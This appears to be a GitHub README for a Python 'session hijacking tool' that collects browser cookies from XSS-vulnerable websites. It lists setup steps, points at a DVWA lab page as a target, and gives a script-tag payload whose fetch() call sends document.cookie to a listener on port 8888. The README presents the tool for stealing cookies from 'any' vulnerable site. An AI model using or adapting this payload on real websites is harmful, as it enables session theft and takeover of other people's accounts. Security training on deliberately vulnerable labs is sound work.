# Session Hijacking Tool
This tool steals the cookie of any xss vulnerable website when payload is injected in user input field

# Technologies
python

# Installation & Usage:
1. clone the repo: https://github.com/pranavpenugonda/session-hijacking.git
2. run cookieSteal.py-> python3 cookieSteal.py
3. options will be displayed to the user
4. start server-> start localhost 8888
5. open browser and open xss vulnerable website like "http://lab.awh.zdresearch.com/chapter1/DVWA/vulnerabilities/xss_r/"
6. it has user input field, enter the payload
7. sample payload: <script>fetch(`http://localhost:8888?data=${document.cookie}`)</script>
8. after clicking on submit, check on terminal and you can see the cookie
   ![image](https://github.com/pranavpenugonda/session-hijacking/assets/92200984/f15892fa-93b8-4c49-9ff5-72d4f5d2c421)
   ![image](https://github.com/pranavpenugonda/session-hijacking/assets/92200984/a35c1b43-ef04-446f-acef-591f1653fb87)
   ![image](https://github.com/pranavpenugonda/session-hijacking/assets/92200984/bc461465-73d1-4cbe-98c1-c76ab6f56fa4)
